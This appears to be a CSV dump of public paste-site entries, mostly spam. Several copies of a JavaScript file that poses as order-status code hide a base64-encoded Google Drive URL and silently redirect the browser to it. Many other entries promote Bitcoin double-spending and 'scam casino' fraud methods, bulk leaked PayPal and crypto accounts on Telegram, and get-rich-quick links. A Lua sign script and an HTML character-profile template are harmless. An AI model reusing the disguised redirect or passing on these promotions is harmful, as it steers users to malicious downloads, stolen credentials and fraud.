id,title,username,language,date,content
GFpErsKB,Products.js,hubertzoo90,JavaScript,Saturday 3rd of May 2025 07:02:34 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42177/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zG8vP6FF,EARN $900 INSTANTLY 2025 95,Xavdsvrfwfrewffsfsd,JavaScript,Saturday 3rd of May 2025 07:01:43 PM CDT," 
Pdf https://tinyurl.com/freshleaks

bMs86giYJ0
"
7YF94XKx,signWriter caller,yedead1,Lua,Saturday 3rd of May 2025 06:58:22 PM CDT,"-- calls the sign_writer api
os.loadAPI(""sign.lua"")	-- Whatever you called sign_writer

-- SignWriter Options
local opts = {
    h = true,				--Center the text horizontally
    v = true,				--Center the text vertically
    color = ""white"",		--Text color
    backColor = ""black"",	--Background color
    textScale = 1,			--Text scale
    bold = false,			--Bold text (broken)
    italic = false,			--Italic text
    underline = false,		--Underlined text
    strikethrough = false,	--Strikethrough text
    shadow = false,			--Shadow effect
    shadowColor = ""gray"",	--Shadow color
    glow = false, 			--Glow effect 
    glowColor = ""yellow"",	--Glow color
    direction = ""right"",	--Direction for arrow animation
    animation = ""simple"",	--Animation type (drawn is broken)
    delay = 0.5,			--Delay for animation
    arrowColor = ""white""	--Arrow color
}

sign.WriteSign(""Hello World!"", opts)"
pnXGCTqA,Make $1000 15-MINUTES (BEGINNER) L4,Xavdsvrfwfrewffsfsd,JavaScript,Saturday 3rd of May 2025 06:52:31 PM CDT," 
Pdf https://tinyurl.com/freshleaks

EBInXPtp8j
"
EfpuRD9B,Doublespending using Vanity Wallet,x2LeaF,JavaScript,Saturday 3rd of May 2025 06:47:40 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 49440
TnfBLwmx,Leaked Accounts - Fresh Hits,jm33,JavaScript,Saturday 3rd of May 2025 06:47:20 PM CDT,81404 Accounts Posted On https://t.me/leakzbyeminem
hEUizE7d,Order.js,hubertzoo90,JavaScript,Saturday 3rd of May 2025 06:47:12 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/33679/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
MNsdHcAv,EARN $900 INSTANTLY 2025 95,JamalIsNumbaOne,JavaScript,Saturday 3rd of May 2025 06:42:29 PM CDT," 
Pdf https://tinyurl.com/freshleaks

OvYoSwMDwm
"
iu70TFSw,EARN $900 INSTANTLY 2025 95,ceg2917,JavaScript,Saturday 3rd of May 2025 06:33:00 PM CDT," 
Pdf https://tinyurl.com/freshleaks

k9DtsUDEUb
"
HVqMgaRZ,deva,vermilly,HTML,Saturday 3rd of May 2025 06:32:49 PM CDT,"<!--
          
    【F2U】 44.Estinto [ character ]
    
      // Code by Leporidebug

      ////////////////// Rules ///////////////////
      
      Do not redistribute this template
      Please keep the credit somewhere visible
      Feel free to change everything else to your liking
      // Thank you for using this template. //
      
      ////////////////////////////////////////
        
        background : 000000
        body : fffffff
        
        all other colors are bootstrap
      
-->

<div class=""card modal-open"" style=""background-color:#000000;color:#ffffff;box-shadow:0 0 10px rgba(0,0,0,0.4)"">
  <div class=""row no-gutters"">
    <!----- 
      
      
      LEFT - BASIC INFO
      
      
    ----->
    <div class=""col-lg-4 pr-lg-2 pl-lg-0 px-1 flex-column"">
      
      <!---------------
          
          MAIN IMAGE
          
      ----------------->
      <div class=""card p-2 border-0 rounded-0 bg-faded"" style=""min-height:300px;background-size:cover;background-position:top center;
        
        /*----- main image; auto-scale center, replace IMG_URL with image address -----*/;
        background-image:url(https://f2.toyhou.se/file/f2-toyhou-se/images/99755435_DFo87BY7UUlGyg5.jpg);
        
      ""></div>
      
      <div class=""card rounded-0 border-0 p-2 d-flex flex-fill"" style=""background-color:transparent;"">
        
        <!---------------
          
          NAME CARD
          
        ----------------->
        <div class=""container p-0 my-3"">
          <hr class=""mt-0 faded mx-3"" style=""border-color:#ffffff;"">
          
          <!----- BORDER DECOR ----->
          <!----- top left -----><img src=""https://fontmeme.com/permalink/221022/dd0084029e465aa4dc0cb530de4edd2f.png"" alt=""damask-dings-font"" border=""0"" style=""max-height:1.5rem;position:absolute;left:0;top:0;"" class=""faded"">
          
          <!----- top right -----><img src=""https://fontmeme.com/permalink/221022/a6914575e5c99395a51cd58dadbac75c.png"" alt=""damask-dings-font"" border=""0"" style=""max-height:1.5rem;position:absolute;right:0;top:0;"" class=""faded"">
          
          <!----- bottom left -----><img src=""https://fontmeme.com/permalink/221022/c499bcfcc687c6115ef2e91d49b09381.png"" alt=""damask-dings-font"" border=""0"" style=""max-height:1.5rem;position:absolute;left:0;bottom:0;"" class=""faded"">
          
          <!----- bottom right -----><img src=""https://fontmeme.com/permalink/221022/6ad66bd1a65e3a58e270722c803301eb.png"" alt=""damask-dings-font"" border=""0"" style=""max-height:1.5rem;position:absolute;right:0;bottom:0;"" class=""faded"">
          
          
          <!----- NAME ----->
          <h1 class=""text-center p-2 mt-3 mb-0 text-uppercase font-weight-bold"" style=""font-family:'georgia';"">
          
            Deva [देव]
          
          </h1>
          
          <!----- TITLE ----->
          <p class=""faded text-center px-3"" style=""font-family:'optima';letter-spacing:2px;"">
            
            Human Model in a Fantasy Realm
            
          </p>
          
          <hr class=""mb-0 faded mx-3"" style=""border-color:#ffffff;"">
        </div>
        
        
        <!---------------
          
          BASICS
          
        ----------------->
        <div class=""row no-gutters px-2 mb-3"">
      
          
          <!----- AGE ----->
          <div class=""col-6"">
            <p class=""text-muted font-weight-bold text-uppercase"" style=""font-family:'georgia';"">Age</p>
          </div>
          <div class=""col-6"">
            <p class=""text-right font-italic"">
              
              20s
              
            </p>
          </div>
          
          <!----- GENDER ----->
          <div class=""col-6"">
            <p class=""text-muted font-weight-bold text-uppercase"" style=""font-family:'georgia';"">Gender</p>
          </div>
          <div class=""col-6"">
            <p class=""text-right font-italic"">
              
              ??? [He/any]
              
            </p>
          </div>
          
      
          <!----- SPECIES ----->
          <div class=""col-6"">
            <p class=""text-muted font-weight-bold text-uppercase"" style=""font-family:'georgia';"">Species</p>
          </div>
          <div class=""col-6"">
            <p class=""text-right font-italic"">
              
              Human 
              
            </p>
          </div>
          
          <!----- Height ----->
          <div class=""col-6"">
            <p class=""text-muted font-weight-bold text-uppercase"" style=""font-family:'georgia';"">Height</p>
          </div>
          <div class=""col-6"">
            <p class=""text-right font-italic"">
              
              6'1"" [185 cm]
              
            </p>
          </div>
          
          <!----- ROLE ----->
          <div class=""col-6"">
            <p class=""text-muted font-weight-bold text-uppercase"" style=""font-family:'georgia';"">Role</p>
          </div>
          <div class=""col-6"">
            <p class=""text-right font-italic"">
              
              Model
              
            </p>
          </div>
          
          <!----- BADGE ----->
          <div class=""col-6"">
            <p class=""text-muted font-weight-bold text-uppercase"" style=""font-family:'georgia';"">Badge</p>
          </div>
          <div class=""col-6"">
            <p class=""text-right font-italic"">
              
              Arcane Agent
              
            </p>
          </div>
          
          <!----- THEME ----->
          <div class=""col-6"">
            <p class=""text-muted font-weight-bold text-uppercase"" style=""font-family:'georgia';"">Theme</p>
          </div>
          <div class=""col-6"">
            <p class=""text-right font-italic"">
              
              <!----- ARTIST INFO ----->
              Fashion Show Theme 
              
              <!----- MUSIC PLAYER ----->
              <a href="""" class=""text-danger"">
                
                <!----- replace [6oVaIuMI0II] with the part of URL found after [https://www.youtube.com/watch?v=] ----->
                <iframe class=""w-100"" frameborder=""0"" style=""height:1.5rem;width:1.5rem; position:absolute;opacity:0.002""
                
                src=""https://www.youtube.com/embed/4KWO3ZGjjPM""

                 ></iframe>
                
                <!----- fontawesome icon here ----->
                <i class=""fas fa-gramophone""></i>
              </a>
            </p>
          </div>
          
          <!----- add more basic info here ----->
          
        </div>
      </div>
    </div>
    <!----- LEFT END ----->
    
       
    <!----- 
      
      
      MIDDLE - QUOTE BOX
      
      
    ----->
    <div class=""col-lg-2 px-1 flex-column mb-lg-0 mb-2"">
      <div class=""card p-lg-3 p-2 border-0 rounded-0 d-flex flex-fill"" style=""background-color:transparent;background-size:200%;background-position:center;
        
        /*----- quote box background; auto-scale center, replace IMG_URL with image address -----*/;
        background-image:url(https://i.pinimg.com/736x/fc/52/81/fc528148c84ba8f6e6c59a4142ac51e8.jpg);
        
      "">
        
        <div class=""card d-flex flex-fill p-2 rounded-0 border-0 justify-content-center"" style=""background-color:rgba(0,0,0,.45);color:#ffffff;"">
          
          <!----- DECOR DIVIDER . ONE ----->
          <div class=""row no-gutters"">
            <div class=""col""><hr style=""border-color:#ffffff;opacity:0.4""></div>
            <div class=""col-auto my-auto px-2"">
            
            <img src=""https://fontmeme.com/permalink/221017/247115f76e8c417383c72978d02844d5.png"" alt=""damask-dings-font"" style=""max-height:1rem;"" border=""0"">
            
            </div>
            <div class=""col""><hr style=""border-color:#ffffff;opacity:0.4""></div>
          </div>
          
          <!----- QUOTE ----->
          <p class=""text-center font-italic"" style=""font-family:'optima'"">
            <!---- fontawesome decor here ----->
            <i class=""fad fa-quote-left fa-fw fa-sm""></i>
            
            
            The numbers don't add up, but skill can override level. I can make this work. I... have to.
            
            
            <!---- fontawesome decor here ----->
            <i class=""fad fa-quote-right fa-fw fa-sm""></i>
          </p>
        </div>
      </div>
    </div>
    <!----- MIDDLE END ----->
    
    
    
    <!----- 
      
      
      RIGHT - PROFILE
      
      
    ----->
    <div class=""col-lg-6 px-1"">
      <div class=""card p-3 border-0 rounded-0"" style=""background-color:transparent;max-height:100vh;overflow:auto;"">
        
        <!---------------
          
          SUMMARY
          
        ----------------->
        <div class=""row no-gutters mb-2"">
          <div class=""col"">
            <hr class=""faded"" style=""border-color:#ffffff;"">
            <p class=""text-lg-center pr-2 mb-2"">
              
              <!----- capitalizes first letter ----->
              <span class=""mx-1 faded"" style=""font-size:1.8rem;font-family: 'georgia';"">A</span> human being sent to live in a magical realm where their life depends on modeling and detective work. They don't pay much attention to their detective tasks, as their allies do most of that. His strength lies within running statistical analyses handed to them, and the analyses they do for model scoring.</p>
              
          </div>
          
          <!----- fontmeme decor ----->
          <div class=""col-auto mt-2 pl-lg-2"">
            <img src=""https://fontmeme.com/permalink/221022/c85e274de6856ecdaeed2a68f5edd099.png"" alt=""damask-dings-font"" border=""0"" style=""max-width:50px;"">
          </div>
          
        </div>
        <!----- SUMMARY END ----->
        
        <!----- DECOR DIVIDER . TWO ----->
        <div class=""row no-gutters mb-2"">
          <div class=""col""><hr style=""border-color:#ffffff;opacity:0.4""></div>
          <div class=""col-auto my-auto px-2"">
            
            <img src=""https://fontmeme.com/permalink/221017/247115f76e8c417383c72978d02844d5.png"" alt=""damask-dings-font"" style=""max-height:1rem;"" border=""0"">
            
          </div>
          <div class=""col""><hr style=""border-color:#ffffff;opacity:0.4""></div>
        </div>
        
        
        <!---------------
          
          PERSONALITY
          
        ----------------->
        <p class=""text-center "" style=""font-family:'optima';letter-spacing:1px;"">
          
          <!----- adjectives ----->
          stubborn . fragile . meticulous
          
          <!----- line break ----->
          <br>
          
          <!----- fontmeme decor ----->
          <img src=""https://fontmeme.com/permalink/221017/ae127416ed9aeeac5acfe85fe09e3c0e.png"" alt=""damask-dings-font"" border=""0"" style=""max-width:2rem;"" class=""faded"">
        </p>
        
        <!----- TRAITS ----->
        <p><span class=""font-italic text-muted mr-1 font-weight-bold"" style=""font-size:1.1rem;font-family:'georgia';"">
            Pressure.</span>
          
          The pressure of successfully completing model shows can get to him. He's come to terms that he won't always get perfect scores. It frustrates them how strange the scoring is, and how they must use incohesive designs to pass. At least the ongoing detective work in this world makes sense to him.
          
        </p>
        
        <!----- Ideology ----->
        <p><span class=""font-italic text-muted mr-1 font-weight-bold"" style=""font-size:1.1rem;font-family:'georgia';"">
            Perception.</span>
          
         Often mistaken for a girl, he doesn't mind it. After all, most people sent to this world are unsuspecting girls, made to fight for survival. There isn't much in-fighting or competition, except among those that came to this world years ago.
        </p>
        
        <!----- Bonds ----->
        <p><span class=""font-italic text-muted mr-1 font-weight-bold"" style=""font-size:1.1rem;font-family:'georgia';"">
            Isolation.</span>
          
          They are rather lonely and feel isolated at times. They don't converse with fellow models, only detective colleagues. Deva often feels sad if they are not busy, and they <i>especially</i> try not to feel homesick (a far worse feeling). 
          
        </p>
        
     
        <!----- PERSONALITY END ----->

        
        <!----- DECOR DIVIDER . FOUR ----->
        <div class=""row no-gutters mb-2"">
          <div class=""col""><hr style=""border-color:rgba(250,250,250,0.5);""></div>
          <div class=""col-auto my-auto px-3"">
            <img src=""https://fontmeme.com/permalink/221017/a598d266c25ae6ff30da91edc190b37b.png"" alt=""damask-dings-font"" border=""0"" style=""max-height:1rem;"">
          </div>
          <div class=""col""><hr style=""border-color:rgba(250,250,250,0.5);""></div>
        </div>
        
        
        <!---------------
          
          LIKES / DISLIKES / TRIVIA
          
        ----------------->
        <div class=""row no-gutters mb-2"">
          
          <!----- LIKES ----->
          <div class=""col-lg-6 mb-lg-0 mb-2"">
            <p class=""font-weight-bold text-uppercase text-muted"" style=""font-family:'georgia';letter-spacing:1px;"">
              「 Likes 」
            </p>
            
            <ul class=""fa-ul"">
              <li><span class=""fa-li faded"">✦</span> Gothic styles</li>
              
              <li><span class=""fa-li faded"">✦</span> Crystals and sparkly items</li>
              
              <li><span class=""fa-li faded"">✦</span> Chocolate</li>
              
              <li><span class=""fa-li faded"">✦</span> Peace</li>
              
              <!----- add more here ----->
              
            </ul>
          </div>
          
          <!----- DISLIKES ----->
          <div class=""col-lg-6"">
            <p class=""font-weight-bold text-uppercase text-muted"" style=""font-family:'georgia';letter-spacing:1px;"">
              「 Dislikes 」
            </p>
            
            <ul class=""fa-ul"">
              <li><span class=""fa-li faded"">✧</span> Housing responsibilities</li>
              
              <li><span class=""fa-li faded"">✧</span> Loud music and noise</li>
              
              <li><span class=""fa-li faded"">✧</span> High pricetags</li>
              
              <li><span class=""fa-li faded"">✧</span> Diary-writing</li>
              
              <!----- add more here ----->
              
            </ul>
          </div>
          
          <!----- TRIVIA ----->
          <div class=""col-lg-12"">
            <p class=""font-weight-bold text-uppercase text-muted"" style=""font-family:'georgia';letter-spacing:1px;"">
              「 Trivia 」
            </p>
            
            <ul class=""fa-ul"">
              <li><span class=""fa-li faded"">•</span> They never understood how cooking works in this world, so they simply don't cook or eat. Strangely, lacking food and other necessities won't impact their health in this world. Are they even human anymore...? </li>
              
              <li><span class=""fa-li faded"">•</span> They have a pet cat named Peepo, though for some reason, <i>that</i> creature requires food and basic needs.</li>
              
              <li><span class=""fa-li faded"">•</span> In his past life, Deva was fairly good at singing and dancing. They also were a data scientist.</li>
              
              <!----- add more here ----->
              
            </ul>
          </div>
        </div>    

        <!----- LIKES / DISLIKES / TRIVIA END ----->
        
        
        <!----- DECOR DIVIDER . FIVE ----->
        <div class=""row no-gutters mb-2"">
          <div class=""col""><hr style=""border-color:#ffffff;opacity:0.4""></div>
          <div class=""col-auto my-auto px-2"">
            
            <img src=""https://fontmeme.com/permalink/221017/247115f76e8c417383c72978d02844d5.png"" alt=""damask-dings-font"" style=""max-height:1rem;"" border=""0"">
            
          </div>
          <div class=""col""><hr style=""border-color:#ffffff;opacity:0.4""></div>
        </div>
        
        
        <!---------------
          
          RELATIONSHIPS
          
        ----------------->
        <!---------- ONE ---------->
        <div class=""row no-gutters mb-3"">
          <!----- AVATAR LINK ----->
          <div class=""col-lg-3 col-4 pr-3"">
            <div class=""card border rounded-0 mx-auto"" style=""background:transparent;"">
              <!----- avatar image ; fixed width 120px, recommend using square icon 200px * 200px ; replace IMG_URL with image address ----->
              <a href=""https://life-makeover.fandom.com/wiki/Larry"" class=""btn p-2 btn-outline-danger rounded-0 border-0"" style=""max-height:180px;"">
                
                <img src=""https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQCyRG6LUeuTcyUbcZYHKckzdYg_1OzRoFezQ&s"">
                
              </a>
            </div>
          </div>
          
          <!----- INFO ----->
          <div class=""col-lg-9 col-8"">
            <!----- fontmeme divider ----->
            <div class=""row no-gutters"">
             
              
            </div>
            
            <!----- main info ----->
            <p>
              <span class=""mx-1 text-muted font-weight-bold"" style=""font-size:1.2rem;font-family: 'georgia';"">
                
                Larry
                
              </span>
              One of the first people he bonded with sincerely. They talk about work, shared aesthetic preferences, and life. Deva learned to feel prideful again in their work, thanks to his encouragement.
            </p>
          </div>
        </div>
        <!----- ONE END ----->
        
        
        <!---------- TWO ---------->
        <div class=""row no-gutters mb-3"">
          <!----- AVATAR LINK ----->
          <div class=""col-lg-3 col-4 pr-3"">
            <div class=""card border rounded-0 mx-auto"" style=""background:transparent;"">
              <!----- avatar image ; fixed width 120px, recommend using square icon 200px * 200px ; replace IMG_URL with image address ----->
              <a href=""https://life-makeover.fandom.com/wiki/Gerald"" class=""btn p-2 btn-outline-danger rounded-0 border-0"" style=""max-width:120px;"">
                
                <img src=""https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSKJCd7zudmNYnwzNg65FU59clTPs2Mzwv9Jw&s"">
                
              </a>
            </div>
          </div>
          
          <!----- INFO ----->
          <div class=""col-lg-9 col-8"">
            <!----- fontmeme divider ----->
            <div class=""row no-gutters"">
              
              
            </div>
            
            <!----- main info ----->
            <p>
              <span class=""mx-1 text-muted font-weight-bold"" style=""font-size:1.2rem;font-family: 'georgia';"">
                
                Gerald
                
              </span>
              Their ""boss"" and main detective coordinator. They were surprised at how nice he can be, despite his initial coldness. A reliable ally.
            </p>
          </div>
        </div>
        <!----- TWO END ----->
        
        
        <!---------- THREE ---------->
        <div class=""row no-gutters mb-3"">
          <!----- AVATAR LINK ----->
          <div class=""col-lg-3 col-4 pr-3"">
            <div class=""card border rounded-0 mx-auto"" style=""background:transparent;"">
              <!----- avatar image ; fixed width 120px, recommend using square icon 200px * 200px ; replace IMG_URL with image address ----->
              <a href=""https://life-makeover.fandom.com/wiki/Roy"" class=""btn p-2 btn-outline-danger rounded-0 border-0"" style=""max-width:120px;"">
                
                <img src=""https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT9_hp8JRn6YnOOUTjpkbPZBqzZqhymPzwYZ5p5ixVRHYOxNgDjxPTdeRW9LJck3gx_QMk&usqp=CAU"">
                
              </a>
            </div>
          </div>
          
          <!----- INFO ----->
          <div class=""col-lg-9 col-8"">
            <!----- fontmeme divider ----->
            <div class=""row no-gutters"">
              
             
            </div>
            
            <!----- main info ----->
            <p>
              <span class=""mx-1 text-muted font-weight-bold"" style=""font-size:1.2rem;font-family: 'georgia';"">
                
                Roy
                
              </span>
              Although their relationship is distant and work-only, Deva can't help but see himself in him. They make an effort to be warm and say hello whenever possible. He probably needs it.
            </p>
          </div>
        </div>
        <!----- THREE END ----->
        
        
        <!----- add more here ----->
        
        
        <!----- DECOR DIVIDER . SIX ----->
        <div class=""row no-gutters mb-2"">
          <div class=""col""><hr style=""border-color:rgba(250,250,250,0.5);""></div>
          <div class=""col-auto my-auto px-3"">
            <img src=""https://fontmeme.com/permalink/221017/a598d266c25ae6ff30da91edc190b37b.png"" alt=""damask-dings-font"" border=""0"" style=""max-height:1rem;"">
          </div>
          <div class=""col""><hr style=""border-color:rgba(250,250,250,0.5);""></div>
        </div>
      </div>
      </div>
      <!------ RELAIONSHIP END ------>
    </div>   

    <!----- RIGHT END ------>
  </div>



<!----- WRAPPER CARD END ----->
<!----- CREDIT ! DO NOT REMOVE ----->
<p class=""text-center small text-uppercase mt-2"">
  <a href=""https://toyhou.se/18523240"" class=""text-muted"" style=""text-decoration:none;"">code by Leporidebug</a>
  |
  <a href=""https://fontmeme.com/"" class=""text-muted"" style=""text-decoration:none;"">decor via fontmeme</a>
</p>
<!----- CODE END ----->"
NKL00uSD,Abuse RBF in BTC transactions,x2LeaF,JavaScript,Saturday 3rd of May 2025 06:32:17 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 47421
43MhDvfp,Chaturbate with Tokens,jm33,JavaScript,Saturday 3rd of May 2025 06:31:59 PM CDT,77265 Accounts Posted On https://t.me/leakzbyeminem
syrpx4dP,Market.js,hubertzoo90,JavaScript,Saturday 3rd of May 2025 06:31:51 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/55074/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fBQjv4Kj,Stake Free Balance Method,x2LeaF,JavaScript,Saturday 3rd of May 2025 06:16:55 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 87657
n9YbhJcL,Crypto Accounts,jm33,JavaScript,Saturday 3rd of May 2025 06:16:37 PM CDT,41563 Accounts Posted On https://t.me/leakzbyeminem
bLTH3m49,Untitled,hubertzoo90,JavaScript,Saturday 3rd of May 2025 06:16:29 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/07886/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
0HzQpbc4,Scam Casinos and Stores,x2LeaF,JavaScript,Saturday 3rd of May 2025 06:01:33 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 56322
aRcBpytN,PayPal with Balance,jm33,JavaScript,Saturday 3rd of May 2025 06:01:15 PM CDT,56873 Accounts Posted On https://t.me/leakzbyeminem
5HDtNKRA,Products.js,hubertzoo90,JavaScript,Saturday 3rd of May 2025 06:01:08 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/05195/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kiYFE8Zy,Doublespending using Vanity Wallet,x2LeaF,JavaScript,Saturday 3rd of May 2025 05:46:12 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 12701
5iq36ydF,Leaked Accounts - Fresh Hits,jm33,JavaScript,Saturday 3rd of May 2025 05:45:52 PM CDT,22656 Accounts Posted On https://t.me/leakzbyeminem
